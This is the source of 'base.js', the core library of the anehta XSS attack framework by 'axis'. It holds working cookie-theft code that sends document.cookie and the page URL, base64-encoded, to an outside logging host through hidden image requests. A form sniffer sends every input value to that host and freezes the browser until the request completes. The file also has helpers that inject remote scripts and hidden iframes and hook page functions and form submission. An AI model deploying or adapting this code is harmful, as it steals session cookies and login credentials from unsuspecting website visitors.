//alert("base.js");
// Author: axis
//////////////////////////////////////////////////
//// 定义常量
//////////////////////////////////////////////////
var anehta = {
        version: '0.3.0',
        author: 'axis',
        contact: 'axis@ph4nt0m.org',
        homepage: 'http://www.ph4nt0m.org',
        blog: 'http://hi.baidu.com/aullik5',
        projecthome: 'http://anehta.googlecode.com'};

var isBaseLibLoaded = "true";
var anehtaurl = "http://www.secwiki.com/anehta";
var feedurl = anehtaurl+"/feed.js";
var logurl = anehtaurl+"/logxss.php?";  // cookie 和 querystring 收集

var NoCryptMark = "    [NoCryptMark]";
var XssInfo_S = "    [**** ";
var XssInfo_E = " ****]\r\n";
var XssGotURI = XssInfo_S+"Request URI: "+escape(window.location.href)+XssInfo_E
var XssGotCookie = XssInfo_S+"Cookie: "+escape(document.cookie)+XssInfo_E

//////////////////////////////////////////////////
//// 定义全局变量
//////////////////////////////////////////////////
var $d=document;
var cache = new Object();

//////////////////////////////////////////////////
//// Core Library
//////////////////////////////////////////////////
anehta.core = {};

// 在time(ms)时间内冻结浏览器;idea from AttackAPI
// 在需要和浏览器抢时间比如关闭窗口,重定向页面时候非常有用
// 在冻结时间内getURL 等还能继续完成
anehta.core.freeze = function(time){
	var date = new Date();
  var cur = null;

  do {
    cur = new Date();
  } while(cur - date < time);
};

anehta.core.grep = function(str){
	
}

anehta.core.parseJSON = function(){
	
}

anehta.core.parseXML = function(){
	
}

//////////////////////////////////////////////////
//// DOM Library
//////////////////////////////////////////////////
anehta.dom = {};

anehta.dom.bindEvent = function (){
	
}

anehta.dom.unbindEvent = function (){
	
}

anehta.dom.getDocument = function (){
	
}

// 添加一个cookie
anehta.dom.addCookie = function (cookieName, cookieValue){
	try{
		if (cookieValue != null){
	    $d.cookie = cookieName + "=" + cookieValue + "\; " + $d.cookie;
	  } else {
	  	$d.cookie = cookieName + "\; " + $d.cookie; // 不需要"="
	  }
  } catch (e){
  	//alert(e);
  }
}

// 检查cookie是否存在,不取值
anehta.dom.checkCookie = function (cookieName){
	var cookies = document.cookie.split( ';' );
	for ( i = 0; i < cookies.length; i++ ){
	  if (cookies[i].indexOf(cookieName) >= 0){
		  return true;
	  }
  }
  return false;
}

// 获取指定cookie的值
// http://techpatterns.com/downloads/javascript_cookies.php
// To use, simple do: Get_Cookie('cookie_name'); 
// replace cookie_name with the real cookie name, '' are required
anehta.dom.getCookie = function (cookieName){
	// first we'll split this cookie up into name/value pairs
	// note: document.cookie only returns name=value, not the other components
	var a_all_cookies = document.cookie.split( ';' );
	var a_temp_cookie = '';
	var cookie_name = '';
	var cookie_value = '';
	var b_cookie_found = false; // set boolean t/f default f
	
	for ( i = 0; i < a_all_cookies.length; i++ )
	{
		// now we'll split apart each name=value pair
		a_temp_cookie = a_all_cookies[i].split( '=' );
		
		
		// and trim left/right whitespace while we're at it
		cookie_name = a_temp_cookie[0].replace(/^\s+|\s+$/g, '');
	
		// if the extracted name matches passed check_name
		if ( cookie_name == cookieName )
		{
			b_cookie_found = true;
			// we need to handle case where cookie has no value but exists (no = sign, that is):
			if ( a_temp_cookie.length > 1 )
			{
				cookie_value = unescape( a_temp_cookie[1].replace(/^\s+|\s+$/g, '') );
			}
			// note that in cases where cookie is initialized but no value, null is returned
			return cookie_value;
			break;
		}
		a_temp_cookie = null;
		cookie_name = '';
	}
	if ( !b_cookie_found ) 
	{
		return null;
	}
}


anehta.dom.setCookie = function (cookieName, cookieValue){
	
}

anehta.dom.delCookie = function (){
	
}

//////////////////////////////////////////////////
//// Net Library
//////////////////////////////////////////////////
anehta.net = {};

// 提交表单  
anehta.net.postForm = function(url){
        var f;
	f=document.createElement('form');	
	f.action=url;
	f.method="post";
	//f.method="get";
	document.getElementsByTagName("body")[0].appendChild(f);
	f.submit();
}

// img get 请求
anehta.net.getURL = function(s){
	var image = new Image();
	image.style.width = 0;
	image.style.height = 0;
	image.src = s;
}

//////////////////////////////////////////////////
//// Logger Library
//////////////////////////////////////////////////
anehta.logger = {};

anehta.logger.logInfo = function(param){
	param = XssInfo_S + "Info: " + param +XssInfo_E;
	param = escape(param);
	anehta.net.getURL(logurl+param)
}

anehta.logger.logCookie = function(){
	var param = XssGotURI+XssGotCookie;  // 传递回server的参数
  param = anehta.crypto.base64encode(param); // base64 加密参数传输; 使用base64加密对性能影响很大
  //alert(param);
  // 发送cookie 和 uri 回 server
  anehta.net.getURL(logurl+param);
}

/*
* Name: logForm
* Args:
*       o - specified form object
*       url - the url you want to get with form information
*       delay - time span you want to delay
* e.g.
*       <form onsubmit="return logForm(this, 'http://www.target.com', 500);" method="post" ...>
*/
anehta.logger.logForm = function(o) {
	//alert("logForm");
	var inputs = o.getElementsByTagName("input");
	//url += "?";
	var param = ""; // form的参数

	for (var i = 0; i < inputs.length; i ++) {
		if (inputs[i].getAttribute("name") != null && 
			inputs[i].getAttribute("name") != "") {
			param += escape(inputs[i].getAttribute("name")) + "=" + escape(inputs[i].value) + "&";
		}
	}
	
	// 记录提交的参数到远程服务器
	param = XssInfo_S + "Form Sniffer: " + escape(param) + XssInfo_E;
	param = anehta.crypto.base64encode(param); //base64时候对时间影响太大,会导致还没发包就页面跳转,从而出错
	//alert(param);
	
	var img = document.createElement("IMG");
	document.body.appendChild(img);
	img.width = 0;
	img.height = 0;
	img.src = logurl+param;
	
	// 需要冻结一段时间保证getURL成功完成
	anehta.core.freeze(300);
	
	//return false;
} 


//////////////////////////////////////////////////
// Ajax Library 
//////////////////////////////////////////////////
anehta.ajax = {};
/*
* XmlHttp 类
*/
anehta.ajax.XmlHttp = function() {
	var o = null;
	
	var readyStateChange = function(processResponseProc) {
		if (o.readyState == 4) {
			//if (o.status == 200 || o.status == 0) {
			// 使得永远返回真.看回显
			if (o.status) {
				processResponseProc(o.responseText, o.getAllResponseHeaders());
			} /*else if (o.status == 302 || o.status == 301 || o.status == 304) { 
				processResponseProc(null, o.getAllResponseHeaders());
			} else {
				processResponseProc(null, null);
			}*/
		}
	};

	var setRequestHeaders = function(headers) {
		var header, name, value;

		if (headers == null || headers == undefined) {
			return;
		}

		for (var i = 0; i < headers.length; i ++) {
			header = headers[i];
			if (header.indexOf(":") < 0) {
				continue;
			}
			name = header.split(":")[0];
			value = header.substring(header.indexOf(":") + 1);
			o.setRequestHeader(name, value);
		}
	}

	return {
		/*
		* init 方法
		*
		* 返回值
		* 如果初始化成功则返回true，否则返回false
		*
		* 说明
		* 初始化XmlHttp对象，
		*/
		init : function() {
			if (o == null) {
				if (window.XMLHttpRequest) {
					try {
						o = new XMLHttpRequest();
					} catch (ex) {
						return false;
					}
				} else if (window.ActiveXObject) {
					try {
						o = new ActiveXObject("Msxml4.XMLHttp");
					} catch (ex) {
						try {
							o = new ActiveXObject("Msxml2.XMLHttp");
						} catch (ex) {
							try {
								o = new ActiveXObject("Microsoft.XMLHttp");
							} catch (ex) {
								return false;
							}
						}
					}
				}
			}

			return true;
		},

		/*
		* get 方法
		*
		* 参数
		* url - 要请求的url
		* processResponse - 处理返回结果委托
		*
		* 返回值
		* 如果请求发起成功则返回true,否则返回false
		*
		* 说明
		* 发起http请求
		*/
		get : function(url, headers, processResponse) {
			try {
				o.open("GET", url, true);
				setRequestHeaders(headers);
				o.onreadystatechange = function() { readyStateChange(processResponse); };
				o.send();
				return true;
			} catch (ex) {
				return false;
			}
		},

		/*
		* post 方法
		*
		* 参数
		* url - 要请求的url
		* data - 发送的数据，注意这里值必须是urlencode过的
		* processResponse - 处理返回结果委托
		*
		* 返回值
		* 如果请求发起成功则返回true,否则返回false
		*
		* 说明
		* 发起post请求
		*/
		post : function(url, data, headers, processResponse) {
			processResponseProc = processResponse;
			try {
				o.open("POST", url, true);
				setRequestHeaders(headers);
				o.onreadystatechange = function() { readyStateChange(processResponse); };
				o.setRequestHeader("Content-Length", data.length);
				o.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
				o.send(data);
				return true;
			} catch (ex) {
				return false;
			}
		}
	};
};

/*  使用方法
var xmlhttp = new anehta.ajax.XmlHttp();
if (xmlhttp.init()) {
	var url = "http://cn.yahoo.com";

	xmlhttp.post(url, "", null, function(response, responseHeaders) {
		if (responseHeaders != null) {
			alert(responseHeaders);
		}

		if (response != null) {
			alert(response);
		}
	});
}
*/

// 初始化
var xmlhttp = new anehta.ajax.XmlHttp();


// 重新封装POST/GET
anehta.ajax.post = function(url, param){ 
  // 第二个参数是提交的参数,第三个参数是headers
	xmlhttp.post(url, param, null, function(response, responseHeaders) {
		 if (responseHeaders != null) {
			 //alert(responseHeaders);
		 }
    
		 if (response != null) {
			 //alert(response);
		 }		    
	 });
}
 
anehta.ajax.get = function(url){
  // 第二个参数是headers
	xmlhttp.get(url, null, function(response, responseHeaders) {
		if (responseHeaders != null) {
			//alert(responseHeaders);
		}
    
		if (response != null) {
			//alert(response);
		}
	});
} 


//////////////////////////////////////////////////
//// Injection Library
//////////////////////////////////////////////////
anehta.inject = {};

anehta.inject.InjectScript = function(ptr_sc){
    s=document.createElement("script");
    s.src=ptr_sc;
    document.getElementsByTagName("body")[0].appendChild(s);
}


anehta.inject.AddScript = function(ptr_sc){
    document.write("<script src='"+ptr_sc+"'></script>");
}

anehta.inject.createIframe = function(w) {
	var d = w.document;
	var newIframe = d.createElement("iframe");
	newIframe.style.width = 0;
	newIframe.style.height = 0;
	d.body.appendChild(newIframe);
	newIframe.contentWindow.document.write("<html><body></body></html>");
	return newIframe;
}

anehta.inject.injectScriptIntoIframe = function(f, proc) {
	var d = f.contentWindow.document;
	var s = "<script>\n(" + proc.toString() + ")();\n</script>";
	d.write(s);
}

anehta.inject.injectIframe = function(remoteurl) {
	var newIframe = $d.createElement("iframe");
	newIframe.style.width = 0;
	newIframe.style.height = 0;
	newIframe.src = remoteurl;
	$d.body.appendChild(newIframe);
	return newIframe;	
}

anehta.inject.injectFlash = function() {
	
}

anehta.inject.injectApplet = function() {
	
}


//////////////////////////////////////////////////
//// Hook Library
//////////////////////////////////////////////////
/* 一般JS函数的hook, 使用委托
   @axis
   注意hook函数加载前,如果函数已经调用了,则该函数无法hook 
   var hj = new hookJsFunction();
   
   //自己定义的函数需要返回一个array作为被hook函数的新参数
   //可以劫持参数,不能递归调用
   hj.hook("被hook的函数名", "保存原函数的变量", "你的函数名");
   
   hi.unhook("被hook的函数名", "保存原函数的变量");
   
   //可以递归注入函数,不能劫持参数
   hj.injectFn("被inject的函数名", "保存原函数的变量", "你的函数名");
*/
anehta.hooklib = {};

anehta.hooklib.hookFn = function (){
	//alert("hookjsfunc");
  // 保存原函数;还是需要作为参数指定一个,
  //否则多次hook后会丢失之前保存的原函数
	//var RealFuncAfterHooked;  

  return {
	  hook: function(funcNameHooked, RealFuncAfterHooked, hookFunc){
	  	try {
	  	  setTimeout(function(){ 
	  		  //alert("hook before: "+window[funcNameHooked]);
	  		  // 保存原函数
	  		  window[RealFuncAfterHooked] = window[funcNameHooked];
	  		  //window[funcNameHooked] = window[hookFunc];
	  		  // 参数个数可以根据需要进行调整
	  		  window[funcNameHooked] = function (param1,param2,param3,param4,param5,param6,param7){
	  		  	// 劫持参数
	  		  	var newParam = new Array();

	  			  // 先执行注入的函数; 需要返回被劫持后的参数,作为新参数传入原函数
	  			  newParam = window[hookFunc](param1, param2, param3, param4, param5, param6, param7); 
	  			  //alert("newParam= "+newParam);
	  			  // 再执行原函数
	  			  window[RealFuncAfterHooked](newParam[0], newParam[1], newParam[2], newParam[3], 
	  			                              newParam[4], newParam[5], newParam[6]); 
	  			                              
	  			  // 不注入参数,直接执行原函数;                            
	  			  //window[RealFuncAfterHooked](param1,param2,param3,param4,param5,param6,param7);  
	  			  }
	  		  //alert("hook after: "+window[funcNameHooked]);
	  		  }, 
		      10);
		    return true;
		  } catch (e){
			  return false;
		  }
	  },
	  
	  unhook: function(funcNameHooked, RealFuncAfterHooked){
	  	try {
	  	  setTimeout(function(){ 
	  		  //alert("unhook before: "+window[funcNameHooked]);
	  		  window[funcNameHooked] = function (param1,param2,param3,param4,param5,param6,param7){
	  			  window[RealFuncAfterHooked](param1,param2,param3,param4,param5,param6,param7);  // 执行原函数;
	  		  }
	  		  //alert("unhook after: "+window[funcNameHooked]);
	  		  }, 
		      10);
		    return true;
		  
		 } catch (e){
		 	  return false;
		 }
	  },
	  
	  injectFn: function(funcNameInjected, RealFuncAfterInjected, injectFunc){
	  	try {
	  	  setTimeout(function(){ 
	  		  // 保存原函数
	  		  window[RealFuncAfterInjected] = window[funcNameInjected];
	  		  // 参数个数可以根据需要进行调整
	  		  window[funcNameInjected] = function (param1,param2,param3,param4,param5,param6,param7){
	  			  // 先执行注入的函数
	  			  window[injectFunc](param1, param2, param3, param4, param5, param6, param7); 
	  			  // 再执行原函数
	  			  window[RealFuncAfterInjected](param1,param2,param3,param4,param5,param6,param7);  
	  			  }
	  		  }, 
		      10);
		    return true;
		  } catch (e){
			  return false;
		  }
	  }	  
	};	
};


/*
* Name: hookSubmit 
* Args:
*       o - specified form object
* e.g.
*       <form onkeydown="javascript: hookSubmit(this);" ..>
*
* If the form uses javascript to call submit method for submitting, you should install a hook on the form.
*/
anehta.hooklib.hookSubmit = function(o, injectFuncCallBack) {
	//alert();
	if (o.hooked == undefined) {
		o.hooked = true;
		o._submit = o.submit;

		o.submit = function() {
			//alert("submit hooked!");
			// hook函数的功能作为第二个参数在这里调用
			injectFuncCallBack();					
			o.onsubmit();
		}
	}
}

//////////////////////////////////////////////////
//// Detect Library
//////////////////////////////////////////////////
anehta.detect = {};

/* detect browser type,version
   var bs = new anehta.detect.browser();
   if ( bs.type() == "msie" ){
	 alert(bs.version());
*/
anehta.detect.browser = function (){
	return {
		type : function(){
			//$.browser.msie/safari/opera/mozilla
			if($.browser.msie){ return "msie";}
			else if($.browser.mozilla){return "mozilla";}
				else if($.browser.opera){return "opera";}
					else if($.browser.safari){return "safari";}
						else {return "unknown";}
		},
		
		version : function(){
			return $.browser.version;	
		}
	};
};


anehta.detect.flash = function (){

}

anehta.detect.java = function (){

}

anehta.detect.internalIP = function (){

}

anehta.detect.hostname = function (){

}

anehta.detect.httponly = function (){
	
}

anehta.detect.activex = function (){
	
}

anehta.detect.ffplugin = function (){

}

anehta.detect.ffextension = function (){

}

anehta.detect.noscript = function (){
	
}


//////////////////////////////////////////////////
// Scanner Library
//////////////////////////////////////////////////
anehta.scanner = {};

anehta.scanner.history = function(){
	
}

anehta.scanner.port = function(){
	
}

anehta.scanner.online = function(){
	
}

anehta.scanner.ping = function(){
	
}

//////////////////////////////////////////////////
// Crypto Library
//////////////////////////////////////////////////
anehta.crypto ={};

//JavaScript　base64_decode
// Copyright (C) 1999 Masanao Izumo <iz@onicos.co.jp>
// Version: 1.0
// LastModified: Dec 25 1999
// This library is free.　You can redistribute it and/or modify it.
//
//
// Interfaces:
// b64 = base64encode(data);
// data = base64decode(b64);
//
var base64EncodeChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
var base64DecodeChars = new Array(
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63,
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1,
    -1,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1,
    -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

anehta.crypto.base64encode = function(str) {
    var out, i, len;
    var c1, c2, c3;
    len = str.length;
    i = 0;
    out = "";
    while(i < len) {
        c1 = str.charCodeAt(i++) & 0xff;
        if(i == len)
        {
            out += base64EncodeChars.charAt(c1 >> 2);
            out += base64EncodeChars.charAt((c1 & 0x3) << 4);
            out += "==";
            break;
        }
        c2 = str.charCodeAt(i++);
        if(i == len)
        {
            out += base64EncodeChars.charAt(c1 >> 2);
            out += base64EncodeChars.charAt(((c1 & 0x3)<< 4) | ((c2 & 0xF0) >> 4));
            out += base64EncodeChars.charAt((c2 & 0xF) << 2);
            out += "=";
            break;
        }
        c3 = str.charCodeAt(i++);
        out += base64EncodeChars.charAt(c1 >> 2);
        out += base64EncodeChars.charAt(((c1 & 0x3)<< 4) | ((c2 & 0xF0) >> 4));
        out += base64EncodeChars.charAt(((c2 & 0xF) << 2) | ((c3 & 0xC0) >>6));
        out += base64EncodeChars.charAt(c3 & 0x3F);
    }
    return out;
}

anehta.crypto.base64decode = function(str) {
    var c1, c2, c3, c4;
    var i, len, out;
    len = str.length;
    i = 0;
    out = "";
    while(i < len){
        /* c1 */
        do {
            c1 = base64DecodeChars[str.charCodeAt(i++) & 0xff];
        } while(i < len && c1 == -1);
        if(c1 == -1)
            break;
        /* c2 */
        do {
            c2 = base64DecodeChars[str.charCodeAt(i++) & 0xff];
        } while(i < len && c2 == -1);
        if(c2 == -1)
            break;
        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));
        /* c3 */
        do {
            c3 = str.charCodeAt(i++) & 0xff;
            if(c3 == 61)
                 return out;
            c3 = base64DecodeChars[c3];
        } while(i < len && c3 == -1);
        if(c3 == -1)
            break;
        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));
        /* c4 */
        do {
            c4 = str.charCodeAt(i++) & 0xff;
            if(c4 == 61)
                return out;
            c4 = base64DecodeChars[c4];
        } while(i < len && c4 == -1);
        if(c4 == -1)
            break;
        out += String.fromCharCode(((c3 & 0x03) << 6) | c4);
    }
    return out;
}


//////////////////////////////////////////////////
// 自定义库
//////////////////////////////////////////////////

